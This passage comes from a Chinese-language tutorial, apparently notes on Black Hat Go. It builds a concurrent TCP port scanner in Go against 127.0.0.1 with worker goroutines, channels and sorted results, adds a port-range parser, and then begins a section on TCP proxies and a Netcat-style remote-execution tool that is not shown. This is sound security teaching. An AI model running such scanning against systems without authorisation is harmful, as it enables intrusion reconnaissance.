</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> { <span style="color:#75715e">// 遍历端口送入通道 ports 中
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>首先 make 一个容量为 100 的缓冲通道，这意味着可以在不等待接收器读取数据的情况下向其发送数据，同时缓冲通道也可以很好地用来维护和跟踪多个生产者和消费者的工作。</p>
<p>接下来，使用 for 循环启动所需数量的工人线程，在函数 worker(ports chan int, * sync.WaitGroup)中，使用 range 连续地从通道 ports 接收数据，直到该通道被关闭。注意，这时工人尚未开始任何工作。在函数 main() 中依次遍历要扫描的端口送入通道 ports 中,然后将通道 ports 中的一个端口发送给工人。完成所有工作后，关闭通道 【close(ports)】。</p>
<p>编写并执行该程序后，你会在屏幕上看到相应的数字。不过，你可能会注意到一个有趣的现象：数字不是以特定的顺序打印的。欢迎来到精彩的并行世界。</p>
<p>结合端口扫描：</p>
<p><img loading="lazy" src="image-20230108185925959.png" alt="image-20230108185925959"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sync&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">wg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">ports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">j</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//fmt.Printf(&#34;Connect port:%d failed\n&#34;, j)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#ae81ff">100</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wg</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; cap(<span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">wg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这样并发端口扫描器就可以正常工作，但是，打印到屏幕的端口将无法排序，因为该端口扫描器不会检查它们的顺序。</p>
<h5 id="1322-多通道通信">1.3.2.2 多通道通信<a hidden class="anchor" aria-hidden="true" href="#1322-多通道通信">#</a></h5>
<p>要解决上面这个问题，你需要使用单独的线程将端口扫描的结果传回主线程，以便在打印之前对端口进行排序。这样修改的另一个好处是，可以完全消除对 WaitGroup 的依赖，因为我们将使用另一种跟踪完成情况的方法。例如，如果扫描1024个端口，则要在工人通道上发送1024次，并且需要将该工作的结果发送回主线程1024次。由于发送的工作单元数量和收到的结果数量相同，因此程序可以知道何时关闭通道并随后关闭工人线程。</p>
<p><img loading="lazy" src="image-20230108184538984.png" alt="image-20230108184538984"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sort&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">results</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">ports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">//fmt.Printf(&#34;Connect port:%d failed\n&#34;, j)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">results</span> <span style="color:#f92672">&lt;-</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">results</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">p</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#ae81ff">100</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">results</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">openports</span> []<span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; cap(<span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">results</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">results</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">openports</span> = append(<span style="color:#a6e22e">openports</span>, <span style="color:#a6e22e">port</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">results</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sort</span>.<span style="color:#a6e22e">Ints</span>(<span style="color:#a6e22e">openports</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">openports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">port</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>修改函数 worker(ports,.results chan int) 以接受两个通道。其余逻辑基本相同，不同之处在于：如果端口关闭，则将发送一个 0 ；如果端口处于打开状态，则将发送端口号。另外，创建一个单独的通道用于将结果从工人程序传递到主线程。然后，可以使用切片，存储结果，以便以后进行排序。接下来，需要单独使用一个 goroutine 把需要探测的端口号发送给工人，因为工人需要在结果收集循环前开始工作。</p>
<p>结果收集循环在 results 通道上接收 1024 次。如果结果不等于 0 ，则会将其追加到切片。关闭通道后，使用 sort 对存储打开端口的切片进行排序。剩下的就是循环切片并将打开的端口打印到屏幕上。</p>
<p>一个高效的端口扫描器就此实现。花一些时间处理代码，尤其是工人的数量。工人的数量越多，程序应执行得越快。但是，如果添加过多的工人，结果就可能会变得不可靠。当编写供其他人使用的工具时，你可以使用一个合理的默认值，以确保结果的可靠性。不过，你还应允许用户选择工人的数量。</p>
<p>你可以对该程序进行一些改进。首先，为扫描的每个端口发送 results 通道，但你不必非得这么做；你还可以把代码写得复杂一点，因为它使用附加通道不仅是为了跟踪工人，而且为了能通过确保所有结果收集的完成来<strong>防止出现竞态条件</strong>。因为这是介绍性的一章，所以我们有意省略了这些内容。不过，不用担心，我们将在第3章中介绍这种模式。其次，你可能希望扫描器能够解析端口字符串，例如80、443、8080、21-25。如果要查看其实现，请参见https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/。我们将其作为练习供读者探索。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">portformat</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;errors&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strconv&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strings&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">porterrmsg</span> = <span style="color:#e6db74">&#34;Invalid port specification&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 处理 1-65535 类型，逐个添加到扫描的端口切片中
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">dashSplit</span>(<span style="color:#a6e22e">sp</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">ports</span> <span style="color:#f92672">*</span>[]<span style="color:#66d9ef">int</span>) <span style="color:#66d9ef">error</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">sp</span>, <span style="color:#e6db74">&#34;-&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">dp</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">start</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">dp</span>[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">end</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">dp</span>[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">start</span> &gt; <span style="color:#a6e22e">end</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">start</span> &lt; <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">end</span> &gt; <span style="color:#ae81ff">65535</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> ; <span style="color:#a6e22e">start</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">end</span>; <span style="color:#a6e22e">start</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span> = append(<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">start</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 将端口字符串转换成 int 类型，并添加到要扫描的端口切片中
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">p</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">ports</span> <span style="color:#f92672">*</span>[]<span style="color:#66d9ef">int</span>) <span style="color:#66d9ef">error</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> &lt; <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">i</span> &gt; <span style="color:#ae81ff">65535</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">porterrmsg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span> = append(<span style="color:#f92672">*</span><span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Parse turns a string of ports separated by &#39;-&#39; or &#39;,&#39; and returns a slice of Ints.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">s</span> <span style="color:#66d9ef">string</span>) ([]<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> []<span style="color:#66d9ef">int</span>{}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;-&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">sp</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">p</span>, <span style="color:#e6db74">&#34;-&#34;</span>) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dashSplit</span>(<span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">sp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;,&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">sp</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">p</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">s</span>, <span style="color:#e6db74">&#34;-&#34;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dashSplit</span>(<span style="color:#a6e22e">s</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">convertAndAddPort</span>(<span style="color:#a6e22e">s</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ports</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="2构造tcp代理">2.构造TCP代理<a hidden class="anchor" aria-hidden="true" href="#2构造tcp代理">#</a></h2>
<p>上一节主要介绍如何从客户端的角度使用net包，而本节将介绍使用它创建TCP服务器和传输数据的方法。
我们将首先介绍如何构建必要的回显服务器（该服务器仅回显给定响应到客户端），之后将介绍有关两个较为通用的程序的知识，即如何创建TCP端口转发器以及如何重新创建Netcat的“安全巨洞”用于远程命令执行。</p>
<h3 id="21-使用-ioreader-和-iowriter">2.1 使用 io.Reader 和 io.Writer<a hidden class="anchor" aria-hidden="true" href="#21-使用-ioreader-和-iowriter">#</a></h3>
<p>要创建本节中的示例，无论你使用的是TCP、HTTP、文件系统还是任何其他方式，都需要使用两种类型：io.Reader 和 io.Writer 。对于所有输入/输出(I/O)任务来说，这两种数据类型都是必不可少的。它们是 Go 内置 io 包的一部分，是所有本地或网络数据传输的基础。这两种数据类型在 Go 的文档中定义如下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Reader</span> <span style="color:#66d9ef">interface</span> {
